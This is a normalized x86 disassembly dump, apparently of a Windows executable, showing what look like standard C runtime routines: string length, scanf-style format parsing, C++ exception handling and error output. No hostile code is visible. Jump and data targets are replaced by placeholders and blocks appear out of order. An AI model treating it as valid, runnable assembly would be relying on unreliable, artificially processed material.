mov esi ecx
mov [ esi ] r--data
call sub_408509
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_404977
pop ecx
sub_40858e
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
call sub_408527
mov eax esi
pop esi
pop ebp
retn 0x4
sub_4085c2
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_4085ea
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
pop edi
mov [ ebp - 0x4 ] eax
pop esi
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov [ ebp - 0xc ] 0x1994000
sub_408640
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_4086cb
mov edi edi
push ebp
mov ebp esp
mov eax [ esi ]
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
mov ecx [ edi ]
push 0x2
push eax
cmp ecx [ ebp + 0xc ]
jne r-xdata
push ecx
call sub_407f38
add esp 0xc
test eax eax
je r-xdata
call sub_407e9e
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
jne r-xdata
xor eax eax
pop ebp
retn
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x1
push [ esi ]
push [ ebp + 0xc ]
push [ edi ]
call sub_405260
add esp 0xc
jmp r-xdata
shl [ esi ] 0x1
sub_408722
mov edi edi
push ebp
mov ebp esp
movzx eax [ ebp + 0x8 ]
push eax
call sub_40c6bd
test eax eax
movsx eax [ ebp + 0x8 ]
pop ecx
jne r-xdata
pop ebp
retn
and eax 0xffffffdf
sub eax 0x7
sub_408758
mov edi edi
push ebp
mov ebp esp
push ebx
mov eax ebx
pop ebx
pop ebp
retn
movzx eax bl
push eax
call sub_40c7c2
pop ecx
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
inc [ esi ]
call sub_408742
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
sub_408782
mov edi edi
push ebp
mov ebp esp
sub esp 0x200
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
xor edi edi
mov [ ebp - 0x1e8 ] ecx
lea ecx [ ebp - 0x184 ]
mov [ ebp - 0x1a4 ] eax
mov [ ebp - 0x1b0 ] ecx
mov [ ebp - 0x1dc ] 0x15e
mov [ ebp - 0x1d0 ] edi
mov [ ebp - 0x1ec ] edi
mov [ ebp - 0x194 ] edi
cmp esi edi
jne r-xdata
cmp eax edi
je r-xdata
call sub_405926
mov [ eax ] 0x16
call sub_4058d4
or eax 0xffffffff
jmp r-xdata
test [ eax + 0xc ] 0x40
push ebx
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40568f
leave
retn
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x1fc ]
call sub_405cbc
mov al [ esi ]
mov [ ebp - 0x1a5 ] 0x0
mov [ ebp - 0x18c ] edi
mov [ ebp - 0x1cc ] edi
test al al
je r-xdata
push eax
call sub_40b3e6
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
cmp [ ebp - 0x1f0 ] 0x0
je r-xdata
mov edi esi
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov eax [ ebp - 0x1cc ]
mov eax [ ebp - 0x1f4 ]
and [ eax + 0x70 ] 0xfffffffd
mov al [ edi ]
cmp al 0x25
jne r-xdata
push [ ebp - 0x1a4 ]
dec [ ebp - 0x18c ]
lea esi [ ebp - 0x18c ]
call sub_408758
pop ecx
cmp eax 0xffffffff
je r-xdata
call sub_405926
mov [ eax ] 0x16
call sub_4058d4
or eax 0xffffffff
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov ebx eax
sar ebx 0x5
shl ecx 0x6
add ecx [ ebx * 4 + rw-data ]
jmp r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_408742
mov ebx eax
movzx eax [ edi ]
inc edi
mov [ ebp - 0x194 ] ebx
mov [ ebp - 0x1bc ] edi
cmp eax ebx
jne r-xdata
cmp [ edi + 0x1 ] al
je r-xdata
inc edi
movzx eax [ edi ]
push eax
call sub_40c7c2
pop ecx
test eax eax
jne r-xdata
push [ ebp - 0x1a4 ]
push eax
call sub_40c912
pop ecx
pop ecx
pop ebx
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
cmp ebx 0xffffffff
movzx eax bl
push eax
call sub_40c00c
pop ecx
test eax eax
je r-xdata
cmp al 0x25
jne r-xdata
xor eax eax
mov [ ebp - 0x1e4 ] eax
mov [ ebp - 0x1d1 ] al
mov [ ebp - 0x1ac ] eax
mov [ ebp - 0x1b8 ] eax
mov [ ebp - 0x19c ] eax
mov [ ebp - 0x1a8 ] al
mov [ ebp - 0x1a7 ] al
mov [ ebp - 0x19d ] al
mov [ ebp - 0x18d ] al
mov [ ebp - 0x1a6 ] al
mov [ ebp - 0x195 ] al
mov [ ebp - 0x185 ] 0x1
mov [ ebp - 0x1d8 ] eax
xor esi esi
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x1d0 ] 0x1
jne r-xdata
push [ ebp - 0x1a4 ]
push [ ebp - 0x194 ]
call sub_40c912
pop ecx
pop ecx
cmp [ ebp - 0x194 ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_408742
movzx ecx [ edi ]
inc edi
mov [ ebp - 0x1bc ] edi
cmp ecx eax
jne r-xdata
cmp [ edi + 0x1 ] al
jne r-xdata
cmp ebx 0x4e
jg r-xdata
mov eax [ ebp - 0x19c ]
inc [ ebp - 0x1b8 ]
imul eax eax 0xa
lea eax [ eax + ebx - 0x30 ]
mov [ ebp - 0x19c ] eax
jmp r-xdata
mov al [ edi ]
test al al
jne r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
cmp [ ebp - 0x194 ] 0xffffffff
jne r-xdata
push [ ebp - 0x1b0 ]
call sub_405655
pop ecx
cmp [ edi ] 0x25
jne r-xdata
cmp eax 0xffffffff
je r-xdata
dec [ ebp - 0x18c ]
inc edi
cmp ebx 0x68
je r-xdata
je r-xdata
cmp [ ebp - 0x18d ] 0x0
je r-xdata
movzx eax al
push eax
call sub_40c7c2
pop ecx
test eax eax
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x1cc ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x1bc ]
cmp [ eax + 0x1 ] 0x6e
jne r-xdata
push [ ebp - 0x1a4 ]
push eax
call sub_40c912
pop ecx
pop ecx
dec [ ebp - 0x185 ]
dec [ ebp - 0x195 ]
cmp ebx 0x6c
je r-xdata
cmp ebx 0x2a
je r-xdata
inc edi
movzx ebx [ edi ]
movzx eax bl
push eax
call sub_40c6bd
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x19d ] 0x0
mov [ ebp - 0x1bc ] edi
jne r-xdata
cmp [ ebp - 0x1f0 ] 0x0
je r-xdata
cmp [ ebp - 0x1a5 ] al
jne r-xdata
mov edi eax
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x6c
je r-xdata
cmp ebx 0x77
je r-xdata
inc [ ebp - 0x19d ]
jmp r-xdata
cmp ebx 0x46
je r-xdata
xor esi esi
mov eax [ ebp - 0x1e8 ]
mov esi [ eax ]
mov [ ebp - 0x200 ] eax
add eax 0x4
mov [ ebp - 0x1e8 ] eax
jmp r-xdata
mov ecx [ ebp - 0x1f4 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
or eax 0xffffffff
inc [ ebp - 0x1d8 ]
mov edi eax
mov [ ebp - 0x1c8 ] esi
mov [ ebp - 0x1c4 ] esi
jmp r-xdata
inc [ ebp - 0x185 ]
inc [ ebp - 0x195 ]
jmp r-xdata
inc [ ebp - 0x18d ]
jmp r-xdata
cmp ebx 0x49
je r-xdata
movzx ebx [ edi ]
or ebx 0x20
mov [ ebp - 0x1b4 ] ebx
cmp ebx 0x6e
je r-xdata
mov al [ edi ]
cmp al 0x53
je r-xdata
cmp [ ebp - 0x195 ] 0x0
mov [ ebp - 0x1c0 ] esi
mov [ ebp - 0x18d ] 0x0
jne r-xdata
mov cl [ edi + 0x1 ]
cmp cl 0x36
jne r-xdata
cmp ebx 0x4c
jne r-xdata
mov ecx [ ebp - 0x1b8 ]
test ecx ecx
je r-xdata
cmp ebx 0x63
je r-xdata
mov [ ebp - 0x195 ] 0x1
mov [ ebp - 0x195 ] 0xff
cmp al 0x43
jne r-xdata
cmp cl 0x33
jne r-xdata
lea eax [ edi + 0x2 ]
cmp [ eax ] 0x34
jne r-xdata
inc [ ebp - 0x185 ]
jmp r-xdata
cmp ebx 0x6f
jg r-xdata
cmp [ ebp - 0x19c ] 0x0
je r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_408742
cmp ebx 0x7b
je r-xdata
cmp cl 0x64
je r-xdata
lea eax [ edi + 0x2 ]
cmp [ eax ] 0x32
jne r-xdata
mov eax ebx
sub eax 0x70
je r-xdata
je r-xdata
cmp [ ebp - 0x194 ] 0xffffffff
jmp r-xdata
mov esi [ ebp - 0x1c0 ]
mov edi [ ebp - 0x1bc ]
push [ ebp - 0x1a4 ]
lea esi [ ebp - 0x18c ]
call sub_408758
pop ecx
jmp r-xdata
cmp cl 0x69
je r-xdata
mov edi eax
jmp r-xdata
mov [ ebp - 0x185 ] 0x1
sub eax 0x3
je r-xdata
mov ebx [ ebp - 0x194 ]
cmp ebx 0x2d
jne r-xdata
cmp ebx 0x63
je r-xdata
je r-xdata
mov [ ebp - 0x194 ] eax
cmp eax 0xffffffff
je r-xdata
cmp cl 0x6f
je r-xdata
cmp ebx 0x2b
jne r-xdata
mov [ ebp - 0x1a7 ] 0x1
jmp r-xdata
cmp [ ebp - 0x195 ] 0x0
jle r-xdata
dec eax
dec eax
je r-xdata
test ecx ecx
jne r-xdata
push 0x64
pop eax
cmp ebx eax
je r-xdata
cmp cl 0x78
je r-xdata
cmp [ ebp - 0x1d8 ] 0x0
je r-xdata
dec [ ebp - 0x19c ]
jne r-xdata
dec [ ebp - 0x18c ]
cmp [ ebp - 0x194 ] 0xffffffff
mov edi esi
je r-xdata
mov [ ebp - 0x1a6 ] 0x1
sub eax 0x3
je r-xdata
inc [ ebp - 0x19c ]
mov [ ebp - 0x1b8 ] 0x1
jle r-xdata
cmp cl 0x58
jne r-xdata
cmp [ ebp - 0x18d ] 0x0
mov edi [ ebp - 0x1e4 ]
jne r-xdata
cmp [ ebp - 0x18d ] 0x0
jne r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_408742
mov ebx eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1b8 ] 0x0
je r-xdata
push [ ebp - 0x1a4 ]
push [ ebp - 0x194 ]
call sub_40c912
pop ecx
pop ecx
mov ebx [ ebp - 0x194 ]
cmp ebx 0x2d
jne r-xdata
sub eax 0x3
je r-xdata
movzx eax [ edi ]
cmp eax [ ebp - 0x194 ]
jne r-xdata
cmp ebx 0x67
jle r-xdata
jmp r-xdata
cmp [ ebp - 0x1a7 ] 0x0
je r-xdata
cmp [ ebp - 0x1b4 ] 0x78
je r-xdata
cmp [ ebp - 0x1a7 ] 0x0
mov edi [ ebp - 0x1e4 ]
je r-xdata
cmp [ ebp - 0x1b4 ] 0x78
je r-xdata
mov [ ebp - 0x18d ] 0x1
jmp r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_408742
mov [ ebp - 0x194 ] eax
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
cmp ebx 0x2b
jne r-xdata
mov [ ebp - 0x1a7 ] 0x1
jmp r-xdata
cmp [ ebp - 0x195 ] 0x0
jle r-xdata
dec [ ebp - 0x1a5 ]
cmp [ ebp - 0x19d ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp - 0x194 ] 0x2d
jne r-xdata
cmp ebx 0x69
je r-xdata
cmp [ ebp - 0x1b4 ] 0x46
jne r-xdata
neg edi
movzx eax bl
push eax
call sub_40c741
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x1b4 ] 0x70
je r-xdata
mov eax [ ebp - 0x1c8 ]
mov ecx [ ebp - 0x1c4 ]
neg eax
adc ecx 0x0
neg ecx
mov [ ebp - 0x1c8 ] eax
mov [ ebp - 0x1c4 ] ecx
jmp r-xdata
movzx eax bl
push eax
call sub_40c741
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x1b4 ] 0x70
je r-xdata
dec [ ebp - 0x18c ]
cmp eax 0xffffffff
je r-xdata
cmp ebx 0x63
je r-xdata
cmp edi esi
je r-xdata
cmp ebx 0x30
jne r-xdata
dec [ ebp - 0x19c ]
jne r-xdata
cmp [ edi + 0x1 ] 0x5e
lea esi [ edi + 0x1 ]
jne r-xdata
mov [ ebp - 0x1a6 ] 0x1
mov edi [ ebp - 0x1bc ]
inc [ ebp - 0x1a5 ]
inc edi
mov [ ebp - 0x1bc ] edi
jmp r-xdata
mov eax [ ebp - 0x200 ]
mov [ ebp - 0x1e8 ] eax
jmp r-xdata
cmp [ ebp - 0x194 ] 0x2b
jne r-xdata
mov eax [ ebp - 0x1b0 ]
mov [ eax ] 0x2d
inc ebx
jmp r-xdata
mov [ ebp - 0x1b4 ] eax
cmp ebx 0x6e
jne r-xdata
cmp [ ebp - 0x1ac ] 0x0
je r-xdata
and [ ebp - 0x1ac ] 0x0
dec [ ebp - 0x18c ]
cmp ebx 0xffffffff
je r-xdata
push ebx
shl edi 0x4
call sub_408722
mov ebx eax
pop ecx
mov [ ebp - 0x194 ] ebx
movzx eax bl
push eax
call sub_40c6bd
pop ecx
test eax eax
je r-xdata
dec [ ebp - 0x18c ]
cmp ebx 0xffffffff
je r-xdata
mov esi [ ebp - 0x1c8 ]
mov edi [ ebp - 0x1c4 ]
shld edi esi 0x4
push ebx
shl esi 0x4
call sub_408722
mov ebx eax
pop ecx
mov [ ebp - 0x194 ] ebx
movzx eax bl
push eax
call sub_40c6bd
pop ecx
test eax eax
je r-xdata
push [ ebp - 0x1a4 ]
push eax
call sub_40c912
pop ecx
pop ecx
cmp [ ebp - 0x19d ] 0x0
jne r-xdata
cmp ebx 0x73
jne r-xdata
cmp [ ebp - 0x19d ] 0x0
jne r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_408742
mov ebx eax
mov [ ebp - 0x194 ] ebx
cmp bl 0x78
je r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_408742
mov ebx eax
mov [ ebp - 0x194 ] ebx
test ecx ecx
je r-xdata
push 0x20
lea eax [ ebp - 0x24 ]
push 0x0
push eax
call sub_40a4d0
add esp 0xc
cmp [ esi ] 0x5d
jne r-xdata
lea esi [ edi + 0x2 ]
mov [ ebp - 0x1a8 ] 0xff
cmp [ ebp - 0x1b8 ] 0x0
jne r-xdata
dec [ ebp - 0x19c ]
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_408742
mov [ ebp - 0x194 ] eax
cmp [ ebp - 0x19d ] 0x0
mov edi [ ebp - 0x18c ]
je r-xdata
cmp [ ebp - 0x19d ] 0x0
jne r-xdata
push [ ebp - 0x1a4 ]
push ebx
call sub_40c912
pop ecx
pop ecx
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_408742
mov ebx eax
mov [ ebp - 0x194 ] ebx
jmp r-xdata
dec [ ebp - 0x19c ]
je r-xdata
cmp [ ebp - 0x1b4 ] 0x6f
jne r-xdata
push [ ebp - 0x1a4 ]
push ebx
call sub_40c912
pop ecx
pop ecx
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_408742
mov ebx eax
mov [ ebp - 0x194 ] ebx
jmp r-xdata
dec [ ebp - 0x19c ]
je r-xdata
cmp [ ebp - 0x1b4 ] 0x6f
jne r-xdata
inc edi
jmp r-xdata
cmp [ ebp - 0x1a6 ] 0x0
je r-xdata
cmp ebx 0x7b
jne r-xdata
cmp eax 0x9
jl r-xdata
inc [ ebp - 0x1cc ]
cmp ebx 0x63
je r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_408742
cmp [ ebp - 0x1b8 ] 0x0
mov ebx eax
mov [ ebp - 0x194 ] ebx
je r-xdata
cmp bl 0x58
je r-xdata
mov [ ebp - 0x18d ] 0x1
jmp r-xdata
mov dl [ ebp - 0x1d1 ]
jmp r-xdata
mov dl 0x5d
inc esi
mov [ ebp - 0x19 ] 0x20
jmp r-xdata
movzx eax [ ebp - 0x194 ]
jmp r-xdata
or [ ebp - 0x19c ] 0xffffffff
cmp [ ebp - 0x1d8 ] 0x0
je r-xdata
jmp r-xdata
inc [ ebp - 0x1cc ]
mov esi [ ebp - 0x1c0 ]
imul edi edi 0xa
jmp r-xdata
cmp ebx 0x38
jge r-xdata
push 0x0
push 0xa
push [ ebp - 0x1c4 ]
push [ ebp - 0x1c8 ]
call sub_40c0e0
mov esi eax
mov edi edx
jmp r-xdata
cmp ebx 0x38
jge r-xdata
mov [ esi ] al
inc esi
mov [ ebp - 0x1e0 ] al
movzx eax al
push eax
call sub_40c00c
pop ecx
test eax eax
je r-xdata
movsx ebx [ ebp - 0x1a8 ]
xor edx edx
mov ecx eax
and ecx 0x7
inc edx
shl edx cl
mov ecx eax
sar ecx 0x3
movsx ecx [ ebp + ecx - 0x24 ]
xor ecx ebx
mov ebx [ ebp - 0x1b4 ]
test ecx edx
je r-xdata
cmp eax 0x20
jne r-xdata
cmp eax 0xd
jle r-xdata
cmp [ ebp - 0x1a6 ] 0x0
je r-xdata
mov [ ebp - 0x1b4 ] 0x78
jmp r-xdata
sub [ ebp - 0x19c ] 0x2
cmp [ ebp - 0x19c ] 0x1
jge r-xdata
cmp [ ebp - 0x1b4 ] 0x78
mov [ ebp - 0x1ac ] 0x1
je r-xdata
mov al [ esi ]
cmp al 0x5d
jne r-xdata
push eax
call sub_40c6bd
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x185 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c8 ]
mov [ esi ] eax
mov eax [ ebp - 0x1c4 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
inc [ ebp - 0x1ac ]
cmp [ ebp - 0x1b8 ] 0x0
lea edi [ edi + ebx - 0x30 ]
je r-xdata
shl edi 0x3
jmp r-xdata
inc [ ebp - 0x1ac ]
lea eax [ ebx - 0x30 ]
cdq
add esi eax
adc edi edx
cmp [ ebp - 0x1b8 ] 0x0
mov [ ebp - 0x1c8 ] esi
mov [ ebp - 0x1c4 ] edi
je r-xdata
mov esi [ ebp - 0x1c8 ]
mov edi [ ebp - 0x1c4 ]
shld edi esi 0x3
shl esi 0x3
jmp r-xdata
lea eax [ ebp - 0x1fc ]
push eax
mov eax [ ebp - 0x1fc ]
mov [ ebp - 0x1ec ] 0x3f
push [ eax + 0xac ]
lea eax [ ebp - 0x1e0 ]
push eax
lea eax [ ebp - 0x1ec ]
push eax
call sub_40c9f5
mov ax [ ebp - 0x1ec ]
add esp 0x10
mov [ esi ] ax
add esi 0x2
jmp r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_408742
mov [ ebp - 0x1df ] al
mov eax [ ebp - 0x1c0 ]
mov [ eax ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x1c0 ]
xor eax eax
mov [ ecx ] ax
jmp r-xdata
inc [ ebp - 0x18d ]
dec [ ebp - 0x18c ]
cmp ebx 0xffffffff
je r-xdata
cmp [ ebp - 0x1b8 ] 0x0
je r-xdata
inc esi
cmp al 0x2d
jne r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1fc ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ ebp - 0x1a8 ] al
cmp al [ ebp - 0x194 ]
jne r-xdata
mov [ esi ] di
mov [ esi ] edi
jmp r-xdata
mov [ ebp - 0x1c0 ] esi
jmp r-xdata
push 0x30
pop ebx
jmp r-xdata
push [ ebp - 0x1a4 ]
push ebx
call sub_40c912
pop ecx
pop ecx
mov [ ebp - 0x1b4 ] 0x6f
jmp r-xdata
dec [ ebp - 0x19c ]
jne r-xdata
movzx ecx al
mov dl al
mov eax ecx
and ecx 0x7
mov bl 0x1
shl bl cl
shr eax 0x3
lea eax [ ebp + eax - 0x24 ]
or [ eax ] bl
mov ebx [ ebp - 0x1b4 ]
test dl dl
je r-xdata
mov [ ebp - 0x1bc ] esi
mov esi [ ebp - 0x1c0 ]
jmp r-xdata
mov al [ ebp - 0x194 ]
mov ecx [ ebp - 0x1b0 ]
inc [ ebp - 0x1ac ]
mov [ ebx + ecx ] al
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1b0 ]
lea esi [ ebp - 0x1dc ]
call sub_4086cb
add esp 0xc
test eax eax
je r-xdata
cmp [ ebp - 0x1ac ] 0x0
je r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
mov [ ebp - 0x194 ] ebx
inc [ ebp - 0x18d ]
mov cl [ esi ]
cmp cl 0x5d
je r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_408742
mov [ ebp - 0x194 ] eax
movzx eax al
dec [ ebp - 0x18c ]
cmp [ ebp - 0x194 ] 0xffffffff
je r-xdata
cmp [ ebp - 0x194 ] 0x65
je r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_408742
mov ecx [ ebp - 0x1b0 ]
mov [ ebp - 0x194 ] eax
mov al [ ebp - 0x1a8 ]
mov [ ebx + ecx ] al
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1b0 ]
lea esi [ ebp - 0x1dc ]
call sub_4086cb
add esp 0xc
test eax eax
je r-xdata
inc esi
cmp dl cl
jae r-xdata
cmp [ ebp - 0x1ac ] 0x0
je r-xdata
push [ ebp - 0x1a4 ]
push [ ebp - 0x194 ]
call sub_40c912
pop ecx
pop ecx
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
cmp [ ebp - 0x194 ] 0x45
jne r-xdata
movzx eax [ ebp - 0x194 ]
jmp r-xdata
mov [ ebp - 0x185 ] dl
mov dl cl
mov [ ebp - 0x185 ] cl
jmp r-xdata
cmp [ ebp - 0x19d ] 0x0
jne r-xdata
mov eax [ ebp - 0x1b0 ]
mov [ ebx + eax ] 0x65
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1b0 ]
lea esi [ ebp - 0x1dc ]
call sub_4086cb
add esp 0xc
test eax eax
je r-xdata
push eax
call sub_40c6bd
pop ecx
test eax eax
jne r-xdata
movzx ecx [ ebp - 0x185 ]
mov eax ecx
and ecx 0x7
mov dl 0x1
shl dl cl
shr eax 0x3
lea eax [ ebp + eax - 0x24 ]
or [ eax ] dl
xor dl dl
jmp r-xdata
mov al [ ebp - 0x185 ]
sub al dl
movzx edi dl
movzx edx al
cmp dl [ ebp - 0x185 ]
jae r-xdata
mov eax [ ebp - 0x1b0 ]
inc [ ebp - 0x1cc ]
lea ecx [ ebp - 0x1fc ]
push ecx
push eax
push [ ebp - 0x1c0 ]
mov [ ebx + eax ] 0x0
movsx eax [ ebp - 0x185 ]
dec eax
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
add esp 0x10
jmp r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_408742
mov [ ebp - 0x194 ] eax
cmp eax 0x2d
jne r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
mov ecx edi
and ecx 0x7
mov eax edi
mov bl 0x1
shl bl cl
shr eax 0x3
lea eax [ ebp + eax - 0x24 ]
or [ eax ] bl
inc edi
dec edx
jne r-xdata
mov ebx [ ebp - 0x1b4 ]
cmp [ ebp - 0x194 ] 0x2b
jne r-xdata
mov eax [ ebp - 0x1b0 ]
mov [ ebx + eax ] 0x2d
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
call sub_4086cb
add esp 0xc
test eax eax
je r-xdata
mov eax [ ebp - 0x1b0 ]
mov cl [ ebp - 0x194 ]
inc [ ebp - 0x1ac ]
mov [ ebx + eax ] cl
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1b0 ]
lea esi [ ebp - 0x1dc ]
call sub_4086cb
add esp 0xc
test eax eax
je r-xdata
movzx eax [ ebp - 0x194 ]
jmp r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_408742
mov [ ebp - 0x194 ] eax
movzx eax al
push eax
call sub_40c6bd
pop ecx
test eax eax
jne r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_408742
mov [ ebp - 0x194 ] eax
and [ ebp - 0x19c ] eax
jmp r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1b0 ]
mov cl [ ebp - 0x194 ]
inc [ ebp - 0x1ac ]
mov [ ebx + eax ] cl
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1b0 ]
lea esi [ ebp - 0x1dc ]
call sub_4086cb
add esp 0xc
test eax eax
je r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_408742
mov [ ebp - 0x194 ] eax
movzx eax al
sub_409786
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn 0x4
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
call sub_40c2b1
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax 0x1994000
jne r-xdata
sub_4097d6
mov edi edi
push ebp
mov ebp esp
xor eax eax
mov eax [ eax * 8 + r--data ]
pop ebp
retn
inc eax
cmp eax 0x16
jb r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax * 8 + r--data ]
je r-xdata
xor eax eax
pop ebp
retn
sub_4097fc
mov edi edi
push ebp
mov ebp esp
sub esp 0x1fc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_4097d6
mov edi eax
xor ebx ebx
pop ecx
mov [ ebp - 0x1fc ] edi
cmp edi ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40568f
leave
retn
push 0x3
call sub_40ce51
pop ecx
cmp eax 0x1
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
push 0x3
call sub_40ce51
pop ecx
test eax eax
jne r-xdata
cmp esi 0xffffffff
je r-xdata
cmp esi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
xor eax eax
push r--data
